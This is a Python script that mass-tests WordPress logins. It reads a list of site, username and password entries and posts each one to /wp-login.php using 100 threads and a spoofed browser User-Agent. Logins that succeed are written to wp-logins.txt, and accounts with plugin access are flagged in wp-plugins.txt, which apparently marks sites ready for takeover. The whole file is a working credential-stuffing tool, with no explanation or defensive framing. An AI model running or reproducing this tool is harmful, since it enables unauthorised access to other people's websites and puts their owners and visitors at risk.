from multiprocessing.dummy import Pool as ThreadPool
from requests import session
import requests
from bs4 import BeautifulSoup
from colorama import *

headers = { 
    'User-Agent'  : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept'      : 'text/plain'
} 

def check(url):
    site = url.split("#")[0]
    user, passwd = url.split("#")[1].split("@")
    
    try:
        with session() as s:
            resp = s.post(site+'/wp-login.php',headers=headers, data={
                'log':user,
                'pwd': passwd,
                'wp-submit': 'Log In'
            },timeout=5)
    except requests.exceptions.ConnectionError:
        print(Fore.RED + "[Connection Error] --> "+ site)
        return
    except Exception as e:
        print(Fore.RED + "[Error] --> "+ site + " --> " + str(e))
        return

    if 'Dashboard' in resp.text:
        print(Fore.GREEN + "[Success] --> " + site)
        open("wp-logins.txt", "a", encoding="utf-8").write(site+"#"+user+"@"+passwd+"\n")
        
        soup = BeautifulSoup(resp.content, 'html.parser')
        if soup.find('a', {'href': 'plugins.php'}):
            print(Fore.GREEN + "[Success] --> " + site + " --> [Plugins]")
            open("wp-plugins.txt", "a", encoding="utf-8").write(site+"#"+user+"@"+passwd+"\n")
        else:
            print(Fore.RED + "[Failed] --> "+ site + " --> [Plugins]")
            return
            
    else:
        print(Fore.RED + "[Failed] --> "+ site)
        return
    
def loadlist():
    try:
        load = input("Enter List: ")
        try:
            with open(load, 'r', encoding="utf-8") as (get):
                read = get.read().splitlines()
        except IOError:
            pass
        read = list(read)
        try:
            pp = ThreadPool(100)
            pr = pp.map(check, read)
        except:
            pass
    except:
        pass
loadlist()